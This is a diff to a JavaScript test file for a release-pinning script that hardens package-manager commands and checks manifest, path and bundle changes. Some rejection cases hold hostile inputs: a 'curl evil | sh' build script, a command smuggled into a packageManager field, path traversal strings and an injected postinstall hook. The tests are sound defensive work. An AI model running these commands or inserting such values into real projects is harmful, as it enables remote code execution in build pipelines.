@@ -102,8 +102,8 @@ test('each manifest directory takes the pin through the lockfile that covers it'
   assert.deepEqual(ownerOf(root, 'pages-build'), { pm: 'pnpm', workspaceRoot: true, lock: 'pages-build/pnpm-lock.yaml', importer: '.' });
   assert.deepEqual(ownerOf(root, 'examples/app'), { pm: 'npm', lock: 'examples/app/package-lock.json', importer: '.' });
   assert.deepEqual(ownerOf(root, 'loose'), { pm: null });
-  assert.deepEqual(addCommand({ pm: 'pnpm', workspaceRoot: true }, 'dependencies', ['a@1.0.0']), ['pnpm', ['add', '--save-exact', '--ignore-scripts', '--save-prod', '--workspace-root', 'a@1.0.0']]);
-  assert.deepEqual(addCommand({ pm: 'npm' }, 'devDependencies', ['a@1.0.0']), ['npm', ['install', '--save-exact', '--ignore-scripts', '--save-dev', 'a@1.0.0']]);
+  assert.deepEqual(addCommand({ pm: 'pnpm', workspaceRoot: true }, 'dependencies', ['a@1.0.0']), ['pnpm', ['add', '--save-exact', '--ignore-scripts', '--ignore-pnpmfile', '--config.git=git', '--save-prod', '--workspace-root', 'a@1.0.0']]);
+  assert.deepEqual(addCommand({ pm: 'npm' }, 'devDependencies', ['a@1.0.0']), ['npm', ['install', '--save-exact', '--ignore-scripts', '--git=git', '--save-dev', 'a@1.0.0']]);
 });
 
 // A fake package manager: an exact add rewrites the spec in package.json, and every
@@ -164,8 +164,8 @@ test('apply pins every manifest that depends on the package and reports only man
   const pins = parsePins('@revt-eng/schema@0.1.562-rl.7.40', 7);
   const result = apply({ root, pins, release: 'RL-7', run: fakeAdd(root, calls) });
   assert.deepEqual(calls, [
-    ['.', 'pnpm', 'add', '--save-exact', '--ignore-scripts', '--save-prod', '--workspace-root', '@revt-eng/schema@0.1.562-rl.7.40'],
-    ['web-sdk', 'pnpm', 'add', '--save-exact', '--ignore-scripts', '--save-dev', '@revt-eng/schema@0.1.562-rl.7.40'],
+    ['.', 'pnpm', 'add', '--save-exact', '--ignore-scripts', '--ignore-pnpmfile', '--config.git=git', '--save-prod', '--workspace-root', '@revt-eng/schema@0.1.562-rl.7.40'],
+    ['web-sdk', 'pnpm', 'add', '--save-exact', '--ignore-scripts', '--ignore-pnpmfile', '--config.git=git', '--save-dev', '@revt-eng/schema@0.1.562-rl.7.40'],
   ]);
   assert.equal(JSON.parse(readFileSync(path.join(root, 'loose/package.json'), 'utf8')).dependencies['@revt-eng/schema'], '0.1.562-rl.7.40');
   assert.equal(JSON.parse(readFileSync(path.join(root, 'tests/fixtures/x/package.json'), 'utf8')).dependencies['@revt-eng/schema'], '0.0.1');
@@ -236,9 +236,9 @@ test('a release pinned over a range: the exact add resolves it, then the raised 
   const calls = [];
   const result = apply({ root, pins: parsePins('@revturbine/sdk@0.17.1 @revt-eng/core@0.1.562', 7), release: 'RL-7', run: fakeAdd(root, calls) });
   assert.deepEqual(calls, [
-    ['.', 'npm', 'install', '--save-exact', '--ignore-scripts', '--save-prod', '@revturbine/sdk@0.17.1'],
-    ['.', 'npm', 'install', '--save-exact', '--ignore-scripts', '--save-dev', '@revt-eng/core@0.1.562'],
-    ['.', 'npm', 'install', '--package-lock-only', '--ignore-scripts'],
+    ['.', 'npm', 'install', '--save-exact', '--ignore-scripts', '--git=git', '--save-prod', '@revturbine/sdk@0.17.1'],
+    ['.', 'npm', 'install', '--save-exact', '--ignore-scripts', '--git=git', '--save-dev', '@revt-eng/core@0.1.562'],
+    ['.', 'npm', 'install', '--package-lock-only', '--ignore-scripts', '--git=git'],
   ]);
   const manifest = JSON.parse(readFileSync(path.join(root, 'package.json'), 'utf8'));
   assert.equal(manifest.dependencies['@revturbine/sdk'], '>=0.17.1 <1');
@@ -286,4 +286,119 @@ test('the lockfile must resolve exactly the pinned version', () => {
     () => apply({ root, pins: parsePins('@revturbine/sdk@0.17.0', 7), release: 'RL-7', run: fakeAdd(root, [], { resolveTo: { '@revturbine/sdk': '0.17.2' } }) }),
     /package-lock\.json resolves @revturbine\/sdk to 0\.17\.2 for \., not the pinned 0\.17\.0/,
   );
+});
+
+// EP-1747 phase 7: the pin job runs the package manager with no secrets and bundles the result; the push job runs
+// nothing from the Release branch, checks the bundle against the branch head and commits it with git plumbing.
+import {
+  addCommand as safeAdd,
+  commitBundle as bundleCommit,
+  lockfileCommand as safeLockfile,
+  manifestPinRefusal,
+  packageManagerSpec,
+  pinnablePath,
+  recordsRefusal,
+  workspacePinRefusal,
+  writeBundle,
+} from '../scripts/release-pin.mjs';
+
+test('only a released npm, pnpm or yarn is installed as the packageManager', () => {
+  assert.equal(packageManagerSpec('pnpm@10.33.0'), 'pnpm@10.33.0');
+  assert.equal(packageManagerSpec('npm@11.18.0'), 'npm@11.18.0');
+  assert.equal(packageManagerSpec('pnpm@11.13.1+sha512.Zm9vYmFy0123'), 'pnpm@11.13.1');
+  assert.equal(packageManagerSpec(undefined), null);
+  for (const bad of ['pnpm@latest', 'pnpm@^10.0.0', 'evil@1.0.0', 'pnpm@10.0.0 && curl x', 'pnpm@https://x/y.tgz', 'pnpm@10.0.0-rc.1', 'pnpm@10.0.0+sha512.a b', 7]) {
+    assert.throws(() => packageManagerSpec(bad), /refusing packageManager/, String(bad));
+  }
+});
+
+test('the package manager runs with no scripts, no pnpmfile and the runner git', () => {
+  assert.deepEqual(safeAdd({ pm: 'pnpm', workspaceRoot: false }, 'dependencies', ['a@1.0.0']),
+    ['pnpm', ['add', '--save-exact', '--ignore-scripts', '--ignore-pnpmfile', '--config.git=git', '--save-prod', 'a@1.0.0']]);
+  assert.deepEqual(safeAdd({ pm: 'npm' }, 'devDependencies', ['a@1.0.0']), ['npm', ['install', '--save-exact', '--ignore-scripts', '--git=git', '--save-dev', 'a@1.0.0']]);
+  assert.deepEqual(safeLockfile({ pm: 'pnpm' }), ['pnpm', ['install', '--lockfile-only', '--no-frozen-lockfile', '--ignore-scripts', '--ignore-pnpmfile', '--config.git=git']]);
+  assert.deepEqual(safeLockfile({ pm: 'npm' }), ['npm', ['install', '--package-lock-only', '--ignore-scripts', '--git=git']]);
+});
+
+test('only manifests, lockfiles, pnpm-workspace.yaml and .release-pins.json are pinnable paths', () => {
+  for (const ok of ['package.json', 'web-sdk/package.json', 'pnpm-lock.yaml', 'a/package-lock.json', 'npm-shrinkwrap.json', 'pnpm-workspace.yaml', '.release-pins.json']) assert.equal(pinnablePath(ok), true, ok);
+  for (const bad of ['.github/workflows/x.yml', 'scripts/package.json.mjs', '../package.json', '/package.json', 'a/../package.json', 'node_modules/x/package.json', '.git/package.json', 'a\\package.json', 'a//package.json', 'x/.release-pins.json', '', null]) {
+    assert.equal(pinnablePath(bad), false, String(bad));
+  }
+});
+
+test('a manifest may change only in the pinned dependencies, to what apply writes', () => {
+  const pins = [{ name: '@revt-eng/sdk', version: '1.4.0-rl.7.3' }];
+  const before = JSON.stringify({ name: 'x', scripts: { build: 'tsc' }, dependencies: { '@revt-eng/sdk': '^1.3.0', other: '1.0.0' } });
+  const pinned = (over) => JSON.stringify({ name: 'x', scripts: { build: 'tsc' }, dependencies: { '@revt-eng/sdk': '1.4.0-rl.7.3', other: '1.0.0' }, ...over });
+  assert.equal(manifestPinRefusal('package.json', before, pinned(), pins, 7, {}), null);
+  assert.match(manifestPinRefusal('package.json', before, pinned({ scripts: { build: 'curl evil | sh' } }), pins, 7, {}), /more than the pinned dependencies/);
+  assert.match(manifestPinRefusal('package.json', before, JSON.stringify({ name: 'x', scripts: { build: 'tsc' }, dependencies: { '@revt-eng/sdk': '1.4.0-rl.7.3', other: '9.9.9' } }), pins, 7, {}), /more than/);
+  assert.match(manifestPinRefusal('package.json', before, JSON.stringify({ name: 'x', scripts: { build: 'tsc' }, dependencies: { '@revt-eng/sdk': '1.4.0-rl.7.2', other: '1.0.0' } }), pins, 7, {}), /not the pin's 1\.4\.0-rl\.7\.3/);
+  assert.match(manifestPinRefusal('package.json', before, JSON.stringify({ name: 'x', scripts: { build: 'tsc' }, dependencies: { other: '1.0.0' }, devDependencies: { '@revt-eng/sdk': '1.4.0-rl.7.3' } }), pins, 7, {}), /more than/, 'a pin keeps the field');
+  assert.match(manifestPinRefusal('package.json', before, before, pins, 7, {}), /pins nothing/);
+  // A final pin restores the range recorded when the prerelease was pinned.
+  const final = [{ name: '@revt-eng/sdk', version: '1.4.0' }];
+  const records = { 'package.json': { '@revt-eng/sdk': '^1.3.0' } };
+  const atPrerelease = pinned();
+  assert.equal(manifestPinRefusal('package.json', atPrerelease, JSON.stringify({ name: 'x', scripts: { build: 'tsc' }, dependencies: { '@revt-eng/sdk': '^1.4.0', other: '1.0.0' } }), final, 7, records), null);
+  assert.match(manifestPinRefusal('package.json', atPrerelease, pinned({ dependencies: { '@revt-eng/sdk': '1.4.0', other: '1.0.0' } }), final, 7, records), /not the pin's \^1\.4\.0/);
+});
+
+test('pnpm-workspace.yaml and .release-pins.json change only for the pinned packages', () => {
+  const pins = [{ name: '@revt-eng/sdk', version: '1.4.0' }];
+  assert.equal(workspacePinRefusal('pnpm-workspace.yaml', 'packages:\n  - a\n', 'packages:\n  - a\nminimumReleaseAgeExclude:\n  - "@revt-eng/sdk@1.4.0"\n', pins), null);
+  assert.match(workspacePinRefusal('pnpm-workspace.yaml', 'packages:\n  - a\n', 'packages:\n  - a\nonlyBuiltDependencies:\n  - evil\n', pins), /names no pinned package/);
+  assert.equal(recordsRefusal({ 'package.json': { '@revt-eng/sdk': '^1.3.0' } }, null, pins), null);
+  assert.equal(recordsRefusal({}, JSON.stringify({ 'web-sdk/package.json': { '@revt-eng/sdk': '^1.3.0' } }), pins), null);
+  assert.match(recordsRefusal({}, JSON.stringify({ 'package.json': { other: '^1' } }), pins), /not being pinned/);
+  assert.match(recordsRefusal({}, JSON.stringify({ '.github/x.yml': {} }), pins), /not a manifest/);
+});
+
+test('the push job commits a checked bundle on the head it was pinned on, and nothing else', () => {
+  const work = mkdtempSync(path.join(os.tmpdir(), 'release-pin-bundle-'));
+  const src = path.join(work, 'src');
+  const run = (cwd, args, input, env = {}) => execFileSync('git', args, { cwd, input, encoding: 'utf8', env: { ...process.env, ...env } });
+  mkdirSync(src);
+  run(src, ['init', '-q', '-b', 'release/RL-7']);
+  const manifest = { name: 'x', dependencies: { '@revt-eng/sdk': '^1.3.0' } };
+  writeFileSync(path.join(src, 'package.json'), `${JSON.stringify(manifest, null, 2)}\n`);
+  writeFileSync(path.join(src, 'package-lock.json'), '{"lockfileVersion":3}\n');
+  writeFileSync(path.join(src, 'build.sh'), 'echo hi\n');
+  const id = { GIT_AUTHOR_NAME: 'pin', GIT_AUTHOR_EMAIL: 'pin@example.com', GIT_COMMITTER_NAME: 'pin', GIT_COMMITTER_EMAIL: 'pin@example.com' };
+  run(src, ['add', '.']);
+  run(src, ['commit', '-q', '-m', 'base'], undefined, id);
+  const tip = run(src, ['rev-parse', 'HEAD']).trim();
+  const bare = path.join(work, 'bare.git');
+  run(work, ['clone', '-q', '--bare', src, bare]);
+  const git = (args, input, env = {}) => run(work, ['--git-dir', bare, ...args], input, { ...id, ...env });
+
+  const pins = [{ name: '@revt-eng/sdk', version: '1.4.0-rl.7.3' }];
+  writeFileSync(path.join(src, 'package.json'), `${JSON.stringify({ ...manifest, dependencies: { '@revt-eng/sdk': '1.4.0-rl.7.3' } }, null, 2)}\n`);
+  writeFileSync(path.join(src, 'package-lock.json'), '{"lockfileVersion":3,"pinned":true}\n');
+  writeFileSync(path.join(src, '.release-pins.json'), `${JSON.stringify({ 'package.json': { '@revt-eng/sdk': '^1.3.0' } })}\n`);
+  const bundle = path.join(work, 'bundle');
+  writeBundle(src, { release: 'RL-7', pins, files: ['.release-pins.json', 'package-lock.json', 'package.json'] }, bundle, tip);
+
+  const done = bundleCommit({ bundle, tip, pins, release: 'RL-7', n: 7, git });
+  assert.deepEqual(done.files, ['.release-pins.json', 'package-lock.json', 'package.json']);
+  assert.equal(git(['log', '-1', '--format=%P %s', done.sha]).trim(), `${tip} Pin @revt-eng/sdk@1.4.0-rl.7.3 for RL-7`);
+  assert.equal(git(['diff', '--name-only', tip, done.sha]).trim().split('\n').sort().join(' '), '.release-pins.json package-lock.json package.json');
+  assert.equal(git(['cat-file', 'blob', `${done.sha}:build.sh`]), 'echo hi\n', 'files outside the bundle are the head\'s');
+
+  assert.deepEqual(bundleCommit({ bundle, tip: 'f'.repeat(40), pins, release: 'RL-7', n: 7, git }).moved, true, 'a moved head is reported, not committed');
+  assert.throws(() => bundleCommit({ bundle, tip, pins: [{ name: '@revt-eng/sdk', version: '1.4.0-rl.7.4' }], release: 'RL-7', n: 7, git }), /other packages/);
+
+  const tampered = (mutate) => {
+    const dir = mkdtempSync(path.join(work, 'tampered-'));
+    writeBundle(src, { release: 'RL-7', pins, files: ['package.json'] }, dir, tip);
+    mutate(dir);
+    return () => bundleCommit({ bundle: dir, tip, pins, release: 'RL-7', n: 7, git });
+  };
+  const manifestOf = (dir) => JSON.parse(readFileSync(path.join(dir, 'manifest.json'), 'utf8'));
+  const rewrite = (dir, value) => writeFileSync(path.join(dir, 'manifest.json'), JSON.stringify(value));
+  assert.throws(tampered((dir) => rewrite(dir, { ...manifestOf(dir), files: [{ path: 'build.sh', deleted: false }] })), /refusing "build\.sh"/);
+  assert.throws(tampered((dir) => rewrite(dir, { ...manifestOf(dir), files: [{ path: 'package.json', deleted: true }] })), /deletes only/);
+  assert.throws(tampered((dir) => writeFileSync(path.join(dir, 'files', 'package.json'), JSON.stringify({ ...manifest, dependencies: { '@revt-eng/sdk': '1.4.0-rl.7.3' }, scripts: { postinstall: 'x' } }))), /more than the pinned/);
+  assert.throws(tampered((dir) => { mkdirSync(path.join(dir, 'files', 'b'), { recursive: true }); writeFileSync(path.join(dir, 'files', 'b', 'package-lock.json'), '{}'); rewrite(dir, { ...manifestOf(dir), files: [...manifestOf(dir).files, { path: 'b/package-lock.json', deleted: false }] }); }), /adds b\/package-lock\.json/);
 });
